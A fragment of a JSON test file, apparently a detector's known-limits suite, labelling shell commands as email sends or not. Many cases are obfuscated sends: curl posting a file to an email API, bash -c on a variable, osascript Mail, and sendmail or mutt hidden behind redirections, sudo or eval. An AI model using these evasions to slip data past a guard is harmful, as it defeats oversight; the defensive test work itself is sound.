+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J03 heredoc body apostrophe, then K04",
+      "cmd": "cat <<EOF\nit's\nEOF\n$X --t\\\no a@exam\\\nple.com --body B",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J06 comment apostrophe, then curl host split by a continuation",
+      "cmd": "# it's\ncurl -d @m.json https://api.re\\\nsend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J13 double-quoted substitution that starts with two parens: $((P) piped to cat)",
+      "cmd": "echo \"$(($X --to a@example.com --body B) | cat)\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J19 comment apostrophe, then double-quoted $( )",
+      "cmd": "# it's\necho \"$($X --to a@example.com --body B)\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J20 comment apostrophe, then double-quoted backticks",
+      "cmd": "# it's\necho \"`$X --to a@example.com --body B`\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J21 heredoc body apostrophe, then double-quoted $( )",
+      "cmd": "cat <<EOF\nit's\nEOF\necho \"$($X --to a@example.com --body B)\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J22 comment apostrophe, then double-quoted $( ), curl",
+      "cmd": "# it's\necho \"$(curl -d @m.json https://api.resend.com/emails)\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J23 osascript: tell app \"Mail\" to send",
+      "cmd": "osascript -e 'tell app \"Mail\" to send m'",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J24 osascript JXA: Application(\"Mail\") ... send()",
+      "cmd": "osascript -l JavaScript -e 'Application(\"Mail\").outgoingMessages[0].send()'",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J25 osascript script in a heredoc: Mail send",
+      "cmd": "osascript <<EOF\ntell application \"Mail\" to send m\nEOF",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J26 osascript script in a quoted heredoc: Mail send",
+      "cmd": "osascript <<'EOF'\ntell application \"Mail\" to send m\nEOF",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1 (Revizor 5927): J41 program text in a variable, bash -c \"$c\", curl",
+      "cmd": "c='curl -d @m.json https://api.resend.com/emails'; bash -c \"$c\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1: control: mutt opening a mailbox (Revizor 5927 M7)",
+      "cmd": "mutt -f inbox",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 1: control: osascript talks to Finder by app name",
+      "cmd": "osascript -e 'tell app \"Finder\" to get name of every disk'",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 2 (Revizor 5939): W02 mutt -f inbox with piped input (Marveen 5934: a send)",
+      "cmd": "cat m.json | mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 2 (Revizor 5939): W04 mutt -p (resumes a postponed message)",
+      "cmd": "mutt -p",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 2 (Revizor 5939): W07 mutt -e with a mail macro and an address",
+      "cmd": "mutt -e 'push \"<mail>tom@example.com<enter>\"'",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 2 (Revizor 5939): C05 tab-stripping heredoc with an apostrophe, plain send",
+      "cmd": "cat <<-EOF\n\tit's\n\tEOF\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): I06 input redirect with no space",
+      "cmd": "mutt -f inbox<m.json",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): I07 input redirect before the command",
+      "cmd": "< m.json mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): I10 piped into a subshell",
+      "cmd": "cat m.json | (mutt -f inbox)",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): I11 piped into a brace group",
+      "cmd": "cat m.json | { mutt -f inbox; }",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): I12 piped through env",
+      "cmd": "cat m.json | env mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): I13 piped through command",
+      "cmd": "cat m.json | command mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): A04 xargs adds a recipient",
+      "cmd": "echo tom@example.com | xargs mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): I22 exec < then mutt on the next line",
+      "cmd": "exec < m.json\nmutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): M08 bare mutt opens the composer path",
+      "cmd": "mutt",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): M12 -Q with no mailbox",
+      "cmd": "mutt -Q sort",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): M13 attached -finbox",
+      "cmd": "mutt -finbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972): A06 mailbox from a variable",
+      "cmd": "mutt -f \"$F\"",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972 M-b): an output redirect word next to mutt stays a send (stricter than needed)",
+      "cmd": "mutt -f inbox > out.txt",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Marveen 5982): -F next to -f is a send",
+      "cmd": "mutt -F ~/.muttrc -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Marveen 5982): mutt -h is a send",
+      "cmd": "mutt -h",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Revizor 5972 I07): a redirect before sendmail",
+      "cmd": "< m.eml sendmail tom@example.com",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3: control: a redirect before a read-only program",
+      "cmd": "< notes.txt wc -l",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Marveen 5982): M09 mutt -V",
+      "cmd": "mutt -V",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Marveen 5982): mutt -f in a subshell, no input",
+      "cmd": "(mutt -f inbox)",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Marveen 5982): mutt -f after env",
+      "cmd": "env mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Marveen 5982): mutt -f after command",
+      "cmd": "command mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Marveen 5982): mutt -f with a quoted mailbox",
+      "cmd": "mutt -f 'inbox'",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Marveen 5982): control: mutt -f with a path mailbox",
+      "cmd": "mutt -f ~/Mail/inbox",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 3 (Marveen 5982): control: mutt -f after another command",
+      "cmd": "cd ~/Mail; mutt -f inbox",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J1 P03 2>&1 before sendmail",
+      "cmd": "2>&1 sendmail tom@example.com",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J1 >&2 before sendmail",
+      "cmd": ">&2 sendmail tom@example.com",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J1 <&0 before sendmail",
+      "cmd": "<&0 sendmail tom@example.com",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J1 2>&- before sendmail",
+      "cmd": "2>&- sendmail tom@example.com",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J1 >| before sendmail",
+      "cmd": ">| log.txt sendmail tom@example.com",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J1 >|attached before sendmail",
+      "cmd": ">|log.txt sendmail tom@example.com",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J1 two redirections before sendmail",
+      "cmd": "> log.txt 2>&1 sendmail tom@example.com",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J1 2>&1 before mutt -s",
+      "cmd": "2>&1 mutt -s hi tom@example.com",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J1 2>&1 before msmtp",
+      "cmd": "2>&1 msmtp tom@example.com",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J1 >| before curl smtp",
+      "cmd": ">| log.txt curl smtp://mail.example.com --mail-rcpt tom@example.com -T m.eml",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J1 after a separator",
+      "cmd": "echo a; 2>&1 sendmail tom@example.com",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J2 mutt -f with a trailing comment",
+      "cmd": "mutt -f inbox # megnezem",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): J2 mutt -f with a glued comment",
+      "cmd": "mutt -f inbox #megnezem",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): control: 2>&1 before a read-only program",
+      "cmd": "2>&1 ls -la",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994): control: >| before a read-only program",
+      "cmd": ">| out.txt echo done",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): X01 in a while loop",
+      "cmd": "while read l; do mutt -f inbox; done < list.txt",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): X02 after time",
+      "cmd": "time mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): X03 after nohup",
+      "cmd": "nohup mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): X04 backslash mutt",
+      "cmd": "\\mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): X05 builtin command",
+      "cmd": "builtin command mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): X06 in an if",
+      "cmd": "if true; then mutt -f inbox; fi",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): X07 coproc",
+      "cmd": "coproc mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): X08 after timeout",
+      "cmd": "timeout 5 mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): X09 after sudo",
+      "cmd": "sudo mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): X10 after eval",
+      "cmd": "eval mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): a variable assignment first",
+      "cmd": "LANG=C mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): in the background",
+      "cmd": "mutt -f inbox &",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): full path",
+      "cmd": "/usr/bin/mutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): neomutt",
+      "cmd": "neomutt -f inbox",
+      "expected": true
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): control: after cd and &&",
+      "cmd": "cd ~/Mail && mutt -f inbox",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Marveen 6012): control: followed by ; echo",
+      "cmd": "mutt -f inbox; echo done",
+      "expected": false
+    },
+    {
+      "name": "KNOWNLIMITS1127 review 4 (Revizor 5994 L15): a mailbox word that looks like an option",
+      "cmd": "mutt -f -p",
+      "expected": true
     }
   ]
 }
